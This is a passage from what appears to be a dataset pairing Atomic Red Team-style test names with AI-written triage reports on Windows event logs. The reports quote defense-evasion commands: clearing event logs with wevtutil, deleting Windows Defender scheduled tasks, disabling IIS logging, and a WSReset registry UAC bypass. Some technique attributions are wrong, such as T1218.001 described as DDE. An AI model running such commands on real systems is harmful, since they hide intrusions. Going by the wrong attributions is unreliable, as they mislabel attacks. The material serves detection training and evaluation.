3. **Audit System Updates:**
   - Confirm whether the Microsoft Edge updates were scheduled and authorized.
   - Ensure the update sources and integrity checks (e.g., file hashes) are verified.

4. **Security Review:**
   - Conduct a thorough review of user ""admin_test"" activities and access logs for any anomalies or unauthorized access.
   - Implement enhanced logging and monitoring for suspicious PowerShell activities and log clearance events."
Invoke CHM Simulate Double click,"Upon reviewing the provided Windows event logs across various channels, several activities suggest suspicious behavior that requires further investigation:

1. **Repeated Use of `wevtutil.exe`:**
   - Multiple instances of `wevtutil.exe`, a command-line tool used to manage event logs, are being executed to clear logs (e.g. `cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, `cl System`). This activity is often associated with attempts to hide malicious activities by wiping logs. The logs indicate both the clearing commands and the cleared logs being recorded in the System and Security logs.

2. **PowerShell Activity:**
   - Multiple PowerShell executions are observed with commands that don't appear to be part of routine system operations, such as:
     - `Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath Test.chm`
     - `Write-Host 'Final result: 1';`
     - `$Res = 0; $Infs = Get-Item -Path ($env:WinDir + '\\inf\\*.inf'); foreach ($Inf in $Infs) { $Data = Get-Content $Inf.FullName; if ($Data -match '\\[defaultinstall.nt(amd64|arm|arm64|x86)\\]') { $Res = 1; break; } } Write-Host 'Final result:', $Res;`
   - Some of these involve executing from non-standard paths or involve operations that inspect installation files, which can indicate reconnaissance or persistence activities.

3. **Privileged Account Usage:**
   - The repeated use of the account `SERVER002\admin_test` for these activities suggests a potentially compromised admin-level account used to execute these commands with high integrity levels. There are also system-level powershell executions indicating possible exploitation attempts using elevated privileges. 

4. **Timing and Consistency:**
   - The sequence and rapid succession of these commands, especially involving the deletion of logs, strongly suggest attempts at covering tracks of potentially malicious actions.

**Assessment:**
The combination of multiple event log clearances, atypical PowerShell usage, and the involvement of a privileged account is highly indicative of potential malicious activity or a compromise.

**Resolution: SUSPICIOUS**
Given the indicators mentioned, the logs showcase activities typically seen in suspicious behavior warranting further investigation. It is recommended to:
- Conduct forensic analysis on the systems involved to retrieve potential evidence.
- Check for unauthorized access or account compromise, especially for the `admin_test` account.
- Review network traffic and additional logs for any signs of data exfiltration or lateral movement.
- Enhance monitoring and implement immediate containment actions, such as resetting credentials and reviewing access permissions for involved accounts."
Delete an entire folder - Windows PowerShell,"Upon reviewing the provided Windows event logs, several indicators suggest suspicious or potentially malicious behavior. Below is a detailed analysis of the logs:

### Analysis:
1. **Security Log (Event ID 1102):** 
   - The event log indicates that the security log was cleared by the user `admin_test`. This can suggest malicious intent as attackers may clear logs to cover their tracks after gaining access or executing a series of unauthorized actions. 

2. **Sysmon Logs:**
   - Event ID 1 (Process Creation): 
     - Several instances of suspicious command-line operations such as the use of `wevtutil.exe` to clear various event logs, including the Microsoft-Windows-Sysmon, System, and Security logs. The use of `wevtutil.exe` to clear event logs is often associated with malicious activity aiming to delete forensic artifacts.
   - Event ID 5 (Process Terminated):
     - Multiple instances align with the process creation entries indicating the clearing of logs by `wevtutil.exe`.
   - The `powershell.exe` command conducted by `admin_test` to remove items could align with activities trying to hide evidence (though in this specific case, it shows deletion from `TEMP` which could be cleanup or standard maintenance).
   
3. **System Logs (Event ID 104):**
   - The clearing of both System and Windows PowerShell logs by `admin_test` further reinforces the notion of log tampering, which is closely associated with malicious activity.

4. **Windows PowerShell Logs:**
   - The command logged as executed involved the removal of a directory (`Remove-Item -Path $env:TEMP\deleteme_folder_T1551.004 -Recurse`). While not directly malicious, such commands can be part of a script intended for cleanup or obfuscation post-exploit.

5. **Application Logs:**
   - No particularly suspicious activities noted related to application logs; however, the focus remains on the intentional clearing of logs.

### Assessment:
The activities captured in these logs, especially the clearing of security, system, and operational logs using both built-in utilities and suspect PowerShell commands, suggest efforts to hide actions on Server002. Log clearing by non-routine processes under administrative accounts like `admin_test` without prior justification or context is a strong indicator of malicious intent.

### Resolution:
**MALICIOUS**

### Guidance:
1. **Immediate Actions:**
   - Take Server002 offline to prevent further compromise or data loss.
   - Conduct a full forensic analysis of the system to capture and analyze memory and disk images.
   - Change all passwords related to the administrative accounts and check for unauthorized creation of backdoor accounts.

2. **Further Steps:**
   - Investigate potential lateral movement to other systems within the network.
   - Review any additional endpoint security solutions for indicators that align with the events observed.
   - Implement stricter monitoring and logging policies to detect and alert similar future activities.

3. **Documentation and Reporting:**
   - Report the incident according to internal policies and any relevant regulatory requirements.
   - Document all findings and actions taken for a comprehensive incident response report.

Using Sysmon and Windows Event logs as evidence, the clearing of logs and suspicious process creation strongly indicate an attempt to obfuscate malicious activities. A thorough investigation and response are crucial to mitigate any broader impacts on the network infrastructure."
Read volume boot sector via DOS device path (PowerShell),"In analyzing the event logs provided, several log entries raise potential concerns regarding suspicious or anomalous activity:

1. **Log Cleared Events:**
   - In the system logs, we observe multiple EventID 104 entries indicating log file clearing. Specifically, logs for ""System,"" ""Windows PowerShell,"" and the ""Security"" logs have been cleared by the user `admin_test`. The deletion of logs, particularly security and system logs, is a known tactic used by malicious actors to cover their tracks.
   - The security log shows an EventID 1102, indicating the security log was cleared. This is a significant red flag as it may indicate someone trying to erase evidence of unauthorized activities.

2. **Powershell Activity:**
   - The PowerShell logs show the use of PowerShell to execute scripts involving direct access to the file system (`IO.FileStream` on `C:\`). This behavior is suspicious, especially as it seems to be executing a file read operation directly from the file system root and performing a format operation on the data. Malicious actors often use PowerShell due to its powerful scripting capabilities and tendency not to be flagged by traditional security methods.
   - The Sysmon logs corroborate the use of PowerShell (EventID 1) with commands that engage with potential CDATA for a hex formatting operation. This resembles behavior seen in reconnaissance or data extraction.

3. **Use of Wevtutil:**
   - The Sysmon logs show multiple executions of `wevtutil.exe` with the command lines specifying the clearing of different logs (security, system, application). The user is again `admin_test`, aligning with the log clearance actions. This utility is significant in clearing event logs and, thus, part of the suspicious activity pattern.

4. **Credential Access Activities:**
   - Security log EventID 5379 detailing several attempts to obtain credential information via Microsoft service account types and returning unsuccessful status codes (`ReturnCode: 3221226021`). These repeated unsuccessful attempts may hint at credential stuffing or brute force attempts.

Given these findings, the activity logged indicates a concerted effort to access sensitive files or information, potentially compromise credentials, and then cover tracks by clearing logs. Therefore, the recommendation for the resolution is:

- **MALICIOUS**: The logs contain multiple indicators of malicious activities such as log clearing, suspicious PowerShell usage, and repeated failed credential access attempts. 

**Guidance on How to Proceed:**
- Conduct a full forensic analysis on the system to determine the extent of the compromise and identify any further malicious artifacts or indicators.
- Review user `admin_test`'s activities and privileges, considering resetting all credentials and potentially investigating insider threat possibilities if this user was legitimate.
- Enhance monitoring for PowerShell activity, particularly focusing on script block logging and transcription.
- Strengthen access controls and review administrative privilege assignments.
- Implement stricter logging mechanisms or a secure log forwarding utility to prevent unauthorized log clearance.
- Consider deploying behavioral detection systems that can alert on similar suspicious command execution patterns in the future."
Delete Windows Defender Scheduled Tasks,"Upon reviewing the provided Windows event logs, the following key observations and analysis can be made:

### Suspicious or Anomalous Behavior

1. **Log Clearing Activities**: 
   - There are multiple instances of log files being cleared across different channels (System, Security, and Windows PowerShell). For example, entries with EventID 104 in the System and Security logs indicate logs being cleared by the user ""admin_test"".
   - The use of the ""wevtutil.exe"" command to clear event logs is notable:
     - `""wevtutil.exe"" cl Microsoft-Windows-Sysmon/Operational`
     - `""wevtutil.exe"" cl Application`
     - `""wevtutil.exe"" cl System`
     - `""wevtutil.exe"" cl Security`
     - `""wevtutil.exe"" cl ""Windows PowerShell""`

2. **Windows Command Line Activity**:
   - Executions of `cmd.exe` with suspicious command-line arguments. There are multiple command entries that query and delete task scheduler tasks related to Windows Defender. This behavior could indicate an attempt to disable or manipulate scheduled tasks:
     - Using `schtasks.exe` to query and delete tasks related to Windows Defender with `/xml` and `/f` flags.
     - This suggests an attempt to either gather information about scheduled security tasks or disable them, which can be a sign of malicious intent.

3. **Process Execution Monitoring**:
   - There are numerous executions of `wevtutil.exe` indicating systematic clearing of event logs, which is often associated with attempts to cover tracks.
   
4. **Unusual Process Execution**:
   - The execution of `wevtutil.exe` and `schtasks.exe` is often associated with administrative tasks or potentially malicious activity when combined with log clearing.
   - The pattern of activity involving querying and possibly deleting tasks under the context of user ""admin_test"" is not typical for regular administrative maintenance and appears orchestrated.

### Malicious Activity or Compromise Indicators

- The combination of clearing event logs, executing command prompt commands specifically targeting security-related tasks, and the persistent use of elevated processes like `wevtutil.exe` and `schtasks.exe` in quick succession hints towards attempts at stealthy operation potentially indicating malicious intent.
- The activity pattern suggests an adversary may be attempting to perform actions without being detected, which aligns with techniques often used in targeted attacks.

### Assessment and Recommendation

**Resolution: MALICIOUS**

Given the deliberate clearing of multiple critical logs, combined with actions that suggest tampering with scheduled tasks — particularly those tied to security functions like Windows Defender — this event set clearly indicates suspicious and hostile behavior. These activities should be considered malicious, and immediate action should be taken. 

**Guidance on How to Proceed:**

1. **Immediate Containment**: The concerned host, ""Server002"", should be isolated to prevent potential lateral movement or further actions by the adversary.
2. **Forensic Investigation**: A thorough forensic examination should be conducted to determine the extent of the compromise and gather artifacts for potential threat actor identification.
3. **Review Privileged Access**: Verify and potentially revoke any unusual administrative access associated with ""admin_test"" or other accounts showing similar behaviors.
4. **Audit and Strengthen Security Controls**: Ensure logging is re-enabled, and additional security monitoring is put in place to detect future anomalous behaviors.
5. **Communicate and Coordinate**: Alert the incident response team and IT security professionals for coordinated remediation efforts."
Msiexec.exe - Execute the DllUnregisterServer function of a DLL,"**Detailed Analysis of the Logs:**

Upon reviewing the Windows event logs provided, there are several events that are worth noting as potential indicators of malicious activity. The primary suspicious behaviors are related to the clearing of event logs and the execution of certain commands, which can suggest attempts to cover tracks after potentially malicious actions. Here's a breakdown of the observations:

1. **Clearing Event Logs:**
   - **System Log (EventID 104):** The event log shows that a user `admin_test` cleared the System and Windows PowerShell logs. This behavior is typically associated with attempts to erase evidence of malicious activities.
   - **Security Log (EventID 1102):** The Security log was also cleared by the user `admin_test`. Clearing security logs is a strong indicator of an attempt to cover tracks after potentially unauthorized actions.

2. **Processes and Command Lines Executed:**
   - **Sysmon Log (Numerous EventIDs 1 and 5):** There are multiple entries showing the execution of `wevtutil.exe` with the command line arguments to clear event logs (`cl`), specifically targeting `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `Windows PowerShell`. These actions correlate with the manual clearing reported in the other logs.
   - **Execution of Potentially Malicious Command:**
     - There's an entry in the Sysmon logs indicating the launch of `cmd.exe` with a command line that includes `msiexec.exe /z ""C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1218.007\bin\MSIRunner.dll""`. This suggests an execution of a DLL file, possibly leveraging the `Msiexec.exe` for DLL side-loading, a common technique used in attacks.

3. **Edge Update Service:**
   - Various entries relate to Microsoft Edge Update components running with typical parameters. While this can be normal, the consistency and timing of these updates in coordination with other activities might be credible as legitimate, but given association with other suspicious behaviors, it requires scrutiny.

**Assessment and Conclusion:**

- **Suspicious Activity Identified:**
  - The frequent and targeted clearing of multiple event logs by a local administrative account is highly indicative of attempts to obfuscate actions that may be unauthorized or malicious.
  - The use of the `wevtutil.exe` command to clear logs directly supports this.
  - The presence of a potentially suspicious command running `msiexec.exe` with a DLL from a path associated with the Atomic Red Team framework (a known tool in threat simulations and security testing) further necessitates investigation.

**Resolution: MALICIOUS**

The activity within these logs aligns strongly with known patterns of malicious behavior, specifically involving log tampering and execution of potentially unauthorized commands. Immediate action should include:

- **Quarantine and Contain:** Isolate the affected `Server002` to prevent further unauthorized activity or data exfiltration.
- **Forensic Investigation:** Conduct a comprehensive forensic analysis to understand the scope and entry point of the breach.
- **Alert and Educate:** Notify the security operations center and relevant stakeholders of the identified breach, and ensure users are educated on safe practices.
- **Review and Patch:** Ensure all systems are updated, and review security policies to strengthen defenses against similar future attempts."
Allow Simultaneous Download Registry,"In reviewing the provided Windows event logs, a few distinct patterns and activities are noteworthy, indicating possible indicators of suspicious or malicious activity:

### Analysis of Log Entries

1. **Security Log - Event ID 1102:**
   - The security log contains an entry indicating that the logs were cleared (`EventID: 1102`). This action was performed by `admin_test` on `Server002`. Clearing logs is a significant red flag indicating a potential cover-up of malicious activity.

2. **System Log - Event ID 104:**
   - Entries show clearing logs for the ""System"" channel and ""Windows PowerShell"" channel by the same user `admin_test`. This further corroborates potentially malicious intentions as it involves removing traces from key event channels, often with the intent to hide unauthorized actions.

3. **Sysmon Log - Process Execution and Commands:**
   - The logs show multiple usages of `wevtutil.exe`, a command-line utility for managing event logs. The logs were cleared using this tool for System, Security, and Windows PowerShell logs. Frequent invocation of `wevtutil` in such a manner is suspicious, especially given its use around the same timestamps that logs were cleared.
   - There are multiple instances of `cmd.exe` executing registry edits on the system. While `reg.exe` manipulation can be legitimate, in the context of the aforementioned events, this could be indicative of malicious configuration changes.
   - The `whoami.exe` and `hostname.exe` commands appear, which can be benign, but in tandem with log clearing, it suggests information gathering in a potentially compromised environment.

4. **Command-line Activity:**
   - The logs detail command-line activity involving potentially non-standard operations or those that appear to relate to environmental probing or configuration manipulation.
   - The command `cmd.exe` runs with a series of registry changes related to internet settings, which is unusual and might indicate attempts to modify system configurations or implement persistence mechanisms.

### Assessment

Given the patterns observed, the accumulation of actions such as clearing logs using administrative credentials, combined with subsequent unusual command-line executions and registry manipulations, these events raise sufficient concern to categorize this behavior as **potentially malicious**.

### Threats/Risks Identified

- **Log Manipulation:** Indicative of potential cover-up of actions that might be indicative of a security breach or malicious insider activity.
- **Registry Modifications:** Suggestive of changes that could affect system performance, security, or policy which are generally unintended without specific administrative needs.
- **Information Gathering Commands:** The use of commands like `whoami` and `hostname` in succession with log-cleaning behavior could suggest reconnaissance activities during a compromised state.

### Guidance on How to Proceed

1. **Escalate Investigation:**
   - This activity should be promptly escalated for deeper investigation, potentially involving forensic analysis to uncover any activities prior to the log clearing.

2. **Audit User Activity:**
   - Review detailed access logs and user activity logs associated with `admin_test`. Determine if this user was acting under legitimate administrative direction or as an insider threat.

3. **Check for Persistence or Backdoors:**
   - Assess the registry changes made for potential persistence mechanisms or malformed entries that could represent backdoors.

4. **Review System Integrity:**
   - Validate system integrity, check for unauthorized software installations, data exfiltration potential, or suspicious network communications.

5. **Implement Monitoring:**
   - Strengthen real-time monitoring for unusual access patterns, log modifications, and command executions.

### Resolution
Based on the investigation, the resolution is determined as **MALICIOUS**. The combination of log clearing, registry manipulation, and unusual command executions warrants this classification. Immediate action and a comprehensive response plan should be adopted to handle this situation effectively."
Disable Windows IIS HTTP Logging via PowerShell,"### Detailed Analysis of the Logs:

Upon investigation, a number of suspicious activities have been identified in the logs provided. 

1. **Security Log Analysis:**
   - **Event ID 1102:** The security log has been cleared by the user ""admin_test"". This event is highly suspicious as it indicates a potential attempt to cover tracks after a compromise. Clearing event logs is a well-known tactic used by attackers to hide their malicious activities.
   - **Event ID 4616:** The system time was changed twice within the same minute. This can be indicative of attempts to desynchronize system logs or tamper with timestamps to confuse log timelines, another technique used to obfuscate malicious activity.

2. **Sysmon Log Analysis:**
   - **Whoami and Hostname Executions:** Several executions of **whoami.exe** and **HOSTNAME.EXE** under the admin_test account. While these are not inherently malicious commands, their frequent execution within a short timeframe could be a part of reconnaissance activity.
   - **PowerShell Execution:** There is a suspicious PowerShell command executed by ""admin_test"":
     - `""powershell.exe"" & {set-WebConfigurationProperty -PSPath ""IIS:\Sites\Default Web Site\"" -filter ""system.webServer/httpLogging"" -name dontLog -value $true}`
     - Disabling logging on an IIS server is malicious as it aims to hide subsequent activity on the web server.
   - **Wevtutil Processes:** Multiple executions of `wevtutil.exe`, used to manage event logs. It was executed to clear the Sysmon logs, evident from command lines like `""C:\\Windows\\system32\\wevtutil.exe\"" cl Microsoft-Windows-Sysmon/Operational""`, which aligns with attempts to hide or alter event log data.

3. **Application Log Analysis:**
   - Unusual stopping of services related to ""edgeupdate"". Normally, updates or unexpected configuration changes can cause services to restart, but without any updates being evident in the logs, this could suggest tampering.

4. **Windows PowerShell Log:**
   - Consistent with the Sysmon logs, PowerShell was used to alter web server configurations without proper logs, supporting the hypothesis that key functionalities/logs are being tampered with to avoid detection.

### Assessment:
The logged activities show strong indicators of malicious actions, particularly the clearing of security and Sysmon logs, modification of IIS server logging configurations, and frequent use of reconnaissance commands. The use of administrative privileges (""admin_test"" user) for these actions suggests a sophisticated attack or an insider threat aiming to manipulate and cover potentially illicit activities on Server002.

### Threats or Risks Identified:
- **Data Integrity Risks:** Altering configuration on the IIS server and system logs threaten the integrity of the system and data stored or transmitted through this server.
- **Security Risks:** The potential for data exfiltration, further unauthorized access, or corruption due to unlogged actions on services like IIS.
- **Operational Risks:** System desynchronization due to time changes and service stops could lead to operational downtime or loss of data integrity.

### Guidance on How to Proceed:
- **Immediate Isolation of the Affected Host:** To prevent further malicious activities.
- **Incident Response Engagement:** To further investigate and contain the threat.
- **Full Audit of Admin Accounts:** To verify the legitimacy of actions performed by admin_test and other privileged accounts.
- **Restore IIS Logging Immediately:** To capture ongoing activities.
- **Strengthen Security Measures:** Implement strict access controls and continuous monitoring to detect unusual activities promptly.
  
### Conclusion:
**Resolution: MALICIOUS**

The logs indicate sophisticated malicious activity that includes log clearing, unauthorized time changes, deliberate disabling of server logging, and potential insider threat behaviors. Immediate action is required to prevent further damage or exploitation."
Enforce Smart Card Authentication Through Registry,"Upon detailed analysis of the provided Windows event logs, several indicators point towards potentially malicious activity. Here is a comprehensive breakdown:

1. **Log Clearing Activity:**
   - Multiple instances of the command-line utility `wevtutil.exe` are noted, particularly with the ""cl"" (clear) command targeting Windows event logs such as ""Microsoft-Windows-Sysmon/Operational"", ""Application"", ""System"", ""Security"", and ""Windows PowerShell"". This is a known technique often used to cover tracks following a compromise.
   - Sysmon Event ID 1 indicates command lines like `wevtutil.exe cl <log>` which is typically not routine unless administered by confirmed scheduled tasks or known maintenance.

2. **Privileged User Actions:**
   - Logs show most of these activities are carried out by the user ""SERVER002\\admin_test"" with a high integrity level, indicating administrative privileges. Inappropriate use of high-privilege accounts to clear logs suggests privileged access used possibly illegitimately.

3. **Registry Modification:**
   - Sysmon records a `cmd.exe` process executing `reg.exe` to alter registry settings. The command modifies the system policy under `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System` which could be indicative of privilege escalation or persistence mechanisms.

4. **Time Change Logs:**
   - Security Event ID 4616 logs show multiple alterations of system time. This can be indicative of efforts to manipulate time-based logs or defenses, aligning with tactics used during unauthorized access attempts.

5. **Processes Run from Temp Directory:**
   - Entries showing processes like `MicrosoftEdgeUpdate.exe` running from temporary directories (e.g., `C:\Program Files (x86)\Microsoft\Temp`) often suggest the presence of staged payloads or obfuscation attempts.

6. **Involvement of `conhost.exe`:**
   - The presence of multiple launching and execution events for `conhost.exe` which is often associated with execution of malicious scripts or programs in a console-like environment.

Given these observations:

- The log-clearing activities using `wevtutil.exe`, combined with registry modifications, time alterations, temporary directory executions, and use of high-privilege accounts for suspicious actions, strongly indicate malicious intent and not routine or benign activities.
  
Resolution: **MALICIOUS**

**Guidance on how to proceed:**
- Immediately conduct a full forensic investigation on the impacted host to ascertain the extent of the compromise.
- Preserve logs and evidence for any legal or investigative follow-ups.
- Reassess the security posture of privileged accounts (e.g., ""admin_test"") and audit their recent activities across the network.
- Apply a comprehensive threat hunting effort to ensure the attacker has not established persistence or impacted other systems.
- Review and patch system vulnerabilities, particularly in remote management services or applications that may have been exploited.
- Re-evaluate logging and monitoring mechanisms to ensure future suspicious activities are detected promptly."
Decompile Local CHM File,"### Detailed Analysis:

Upon reviewing the provided logs for ""Server002"" dated October 26, 2024, I have identified several areas that indicate potential malicious activity:

#### Suspicious Activities:

1. **Log Clearing**:
   - **Event ID 1102** in the Security log and **Event ID 104** in the System log indicate that the security, system, and Windows PowerShell logs were cleared by the user `admin_test`. 
   - Clearing event logs is a known technique used by attackers to cover their tracks post-exploitation.

2. **Sysmon Logs - Process Activities**:
   - Multiple instances of `wevtutil.exe` being executed by the same user (`admin_test`) with the command-line `""C:\\Windows\\system32\\wevtutil.exe"" cl Microsoft-Windows-Sysmon/Operational""` and similar commands for Security, System, and Windows PowerShell channels.
   - **Process Creation** events (Event ID 1) show that `wevtutil.exe` was executed right before the logs were cleared, suggesting deliberate log deletion.
   - The execution of command-line utilities such as `cmd.exe`, `whoami.exe`, and `hh.exe` (`Host Name`, and the `whoami` command) is indicative of enumeration activities typically used by attackers for reconnaissance.
   - The `cmd.exe` with parameters `/c hh.exe -decompile` links to a known Red Team or APT technique mimicking typical command-line attacks outlined in TTPs like T1218.001 (Dynamic Data Exchange or DDE).

3. **Edge Update Instances**:
   - Various instances of `MicrosoftEdgeUpdate.exe` and other related executables are noticed. These may just be routine update processes, but given the timing alongside log clearing and unusual commands, the persistence and frequency stand out. This requires further exploration to ascertain if it's part of a known exploit scenario.

#### Assessment:

- The coordinated execution and timing of log clearing with `wevtutil.exe` and other command-line executions hint strongly at malicious intent.
- Given the information, these activities could represent an attempt at system compromise or unauthorized access. The specific sequence seems to indicate actions taken to obfuscate malicious activities through log manipulation.

### Conclusion:
Resolving this into one of three resolutions:

- **MALICIOUS**: The logs show clear evidence of potentially malicious activity. System logs were possibly tampered with as part of post-exploitation cleanup. Further investigation and remediation are strongly advised.

### Guidance on How to Proceed:

1. **Immediate Actions**:
   - Preserve all logs and related artifacts for forensic review.
   - Initiate containment measures on the host, `Server002`, to prevent further unauthorized access or activity.

2. **Further Investigation**:
   - Collect memory dumps and analyze running processes for any signs of advanced malware or backdoors.
   - Examine other hosts for similar log clearing actions or suspicious activities.

3. **Remediation and Preventive Measures**:
   - Change credentials associated with `admin_test` and all administrative users.
   - Strengthen logging and monitoring to detect any attempts of log clearing or unauthorized administrative actions in real-time.
   - Educate users on recognizing and reporting suspicious activities promptly.

4. **Report**:
   - Document the findings comprehensively to share with the incident response team and management for transparency and further strategic actions."
Setting Shadow key in Registry for RDP Shadowing,"Upon reviewing the provided log entries from various sources, several elements indicate suspicious or potentially malicious activity on the host named Server002. Below is the detailed analysis:

### Key Observations:

1. **Security Log Clear Events:**
   - **Event ID 1102** in the Security log indicates that the audit log has been cleared by user `admin_test`. This is often considered suspicious as attackers may clear logs to hide their tracks.

2. **Execution of Wevtutil.exe:**
   - Multiple instances of `wevtutil.exe` being executed (<s>EventID 1</s> from Sysmon log) with the command `wevtutil.exe cl`, which is the command to clear event logs (`System`, `Security`, `Application`, `Windows PowerShell`). This corroborates the log clear activities observed.

3. **PowerShell Script Execution:**
   - **EventID 1** in the Sysmon log shows the execution of a suspicious PowerShell command managing `Remote Desktop` firewall rules and modifying the registry settings related to Windows Terminal Services. The execution of PowerShell scripts with such commands is often indicative of malicious intent, particularly when dealing with remote access and registry modifications.

4. **Multiple Privileges Assigned:**
   - **Event ID 4672** in the Security log shows the user `admin_test` was granted special privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, `SeEnableDelegationPrivilege`, which could be potentially leveraged for malicious purposes like privilege escalation or lateral movement.

5. **Patterns of Host Commands:**
   - The use of commands like `whoami.exe` and `hostname.exe` in rapid succession can indicate reconnaissance activity, often seen in the early stages of an attack.

6. **Parent Process Context:**
   - Many of the activities, particularly the PowerShell execution and log clearing, use `wsmprovhost.exe` as a parent process. While `wsmprovhost.exe` itself is legitimate, being used as a parent for suspicious activity is worth noting.

### Assessment and Resolution:

Based on the detailed observations:
- The clearing of event logs alongside rapid creation of processes for PowerShell commands that modify system settings strongly indicates malicious activity.
- The grant and utilization of elevated privileges by an admin account without clear, legitimate justification in this context is troubling.

**Resolution: MALICIOUS**

### Recommendations:

1. **Immediate Response:**
   - Alert Incident Response team to isolate and forensically analyze the affected host (Server002).
   - Conduct a thorough investigation to determine the extent of the breach and identify any other compromised systems.

2. **Remediation Measures:**
   - Exercise caution and implement additional security monitoring and restrictions on privileged accounts, especially those like `admin_test`.
   - Review and potentially reconfigure firewall settings and policies related to remote desktop access.
   - Ensure that auditing and alerting are in place for log clear events and execution of administrative utilities.

3. **Post-Incident Actions:**
   - Conduct a users' privileges review and adjust them according to the principle of least privilege.
   - Consider implementing stricter network segmentation and access controls.
   - Train team members on spotting signs of suspicious activity and the importance of logging integrity."
UAC Bypass with WSReset Registry Modification,"After carefully reviewing the provided Windows event logs, the following observations and analysis can be made:

### PowerShell Logs:
- **Suspicious Registry Changes**: The PowerShell logs show a sequence of commands that modify the Windows Registry under the path `HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command`. These changes are made forcefully to alter the default command to launch a new `cmd.exe` process. This behavior can be an indication of malicious intent, possibly to gain persistence or execute commands with elevated privileges.
- **Hidden Process Start**: The command includes starting `WSReset.exe` with a hidden window. `WSReset.exe` is a legitimate tool to clear the Windows Store cache, but its use here with `cmd.exe /c start cmd.exe` is suspicious because it can be exploited to execute further commands.

### System Logs:
- **Log File Clearing**: Events indicate the clearing of System, PowerShell, and Security logs by the user `admin_test`. This action is often malicious in nature as it attempts to remove traces of potentially unauthorized activities.

### Security Logs:
- **Logon and Privilege Escalation**: Multiple logon events for user `admin_test` are recorded, along with elevated privilege usage (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.). The clearing of Security logs further points towards attempts to conceal actions.

### Sysmon Logs:
- **Command-line Activity with Critical Tools**: The execution of `wevtutil.exe` with a command to clear logs is repeated across System, Security, and PowerShell event logs. This matches with actions observed in native logs indicating evidence of tampering.
- **Unusual Process Execution**: The presence of processes being run from temporary directories, and the inclusion of `whoami.exe` or `hostname.exe` being used in suspicious ways, points to information gathering, possibly by an adversary.

### Application Logs:
- **Windows Defender Status**: Windows Defender is recorded as being on and presumably active during this time, which could have missed detections or indicate that any malicious activity may not have been blatant enough to trigger alerts.

### Conclusion:
The logs reveal multiple indicators of potentially malicious activities:
- Registry modifications that alter execution behavior.
- Concealment actions including log clearing using administrative privileges.
- Execution of commands that manipulate critical security logs.

Taking into account the suspicious PowerShell activities and log-clearing actions, there's a strong case for potential compromise. Further investigation is needed, especially focusing on forensic analysis of the registry, user activities, and potentially infected users or attackers' intentions.

**Resolution: MALICIOUS**
- Recommend conducting a full forensic investigation to determine scope.
- Review other systems for similar behaviors or indicators of compromise.
- Consider isolating the impacted host and perform root cause analysis.
- Evaluate incident response procedures and deploy enterprise-wide monitoring and alerting enhancements, such as enhanced endpoint detection and response."
Regsvcs Uninstall Method Call Test,"Based on the analysis of the provided logs, we need to evaluate several factors to understand the nature of the recorded events and their implications:

1. **Event Log Clearing**: 
   - The security log shows an Event ID 1102 indicating that the security log was cleared by a user account named ""admin_test"". Simultaneously, there are event clearances for the System and Windows PowerShell channels (Event ID 104). Log clearing activities, especially in the event logs, are uncommon in routine system administration activities and are often indicative of attempts to cover malicious activity.

2. **Process Execution**: 
   - In the PowerShell logs, there is execution of a PowerShell script (via `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`) that appears to be executing code related to the T1218.009 technique, which relates to masquerading using the Regsvcs tool.
   - Associated with the PowerShell command execution is the creation of a .NET established by compiling code and binding it to a strong name key file, which is a common technique used by adversaries to evade detection.

3. **Privilege Activity**:
   - There are multiple Event ID 4672 logs indicating that accounts with elevated privileges were used, specifically services.exe as SYSTEM. Normally, this type of event is benign, but given the context, it should be scrutinized further.

4. **Unusual Commands**:
   - The execution of `wevtutil.exe` to clear logs for channels like ""Microsoft-Windows-Sysmon/Operational"", ""Application"", and ""Security"" are red flags, as these suggest a pattern to conceal tracks after executing potentially malicious activities.

5. **Modification and Execution**:
   - The combination of executing various scripts and commands (like using regsvcs.exe, which is apparent in the logs and directly associated with T1218.009 via masquerading) strengthens the potential risk that these actions were used for bypassing security controls.
   
Conclusion: The nature of these logs, specifically the clearing of logs, execution of PowerShell scripts involving file creation and compilation, and privilege access, is highly indicative of malicious activity. All these factors align with behaviors typical in compromise scenarios where an actor is attempting to maintain persistence while evading detection.

Final Determination: **MALICIOUS**

**Guidance**:
- Initiate an immediate forensic investigation to provide context to these activities.
- Perform a system integrity check and isolate the affected system.
- Look for Indicators of Compromise (IoCs) related to `T1218.009` technique and logs clearing.
- Conduct a comprehensive review of access and permissions associated with the ""admin_test"" account.
- Enhance monitoring and logging configurations to detect such behavior in the future."
Rundll32 with desk.cpl,"Upon analyzing the provided Windows event logs, several activities stand out:

1. **Clearing of Logs**: 
   - The event with EventID 1102 in the security log indicates the clearing of the event logs by the user `admin_test`. This action can be suspicious, especially if it occurs unexpectedly, as clearing logs might be an attempt to hide malicious activity.
   - Similar actions appear in the system log with EventID 104, indicating that system logs were also cleared around the same time by the same user. This further adds to the suspicion.

2. **Time Change Events**: 
   - The security log item with EventID 4616 shows time changes. While this can happen for legitimate reasons, time tampering is sometimes used to disrupt timelines for incident response. 

3. **Unusual Execution of System Tools**:
   - Several instances of execution of standard system utilities, such as `wevtutil.exe`, `cmd.exe`, and `rundll32.exe`, were observed in the Sysmon logs. While it’s common for these tools to appear in logs, the context raises concerns:
      - `cmd.exe` was used to copy `calc.exe` as `not_an_scr.scr` and then run it with `rundll32.exe`. This command pattern is often used to execute a payload disguised as a screen saver, which is a known technique for executing malicious code.
      - The SHA256 hash `BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0` for the `cmd.exe` process indicates potentially untrusted or malicious code if it does not match the expected hash for legitimate Windows Files.
   
4. **Execution of PowerShell or Other High-level Scripts / Commands**:
   - While not explicitly detailed in the logs provided, it should be noted that any unusual usage of PowerShell or similar utilities can be indicative of malicious activity, especially if used to obscure malicious commands or data exfiltration.

5. **Privilege Assignment and Sensitive Process Execution**:
   - There are events indicating privileged logons and assignments with EventID 4672. Users with admin-like privileges engaging in unexpected activities is concerning, especially in combination with other suspicious behavior.
   
6. **Network Connections or Remote Interactions**:
   - Although specific details about network activity aren't provided, logon events with LogonType 3 (network) that aren't expected or from unusual sources should be scrutinized.

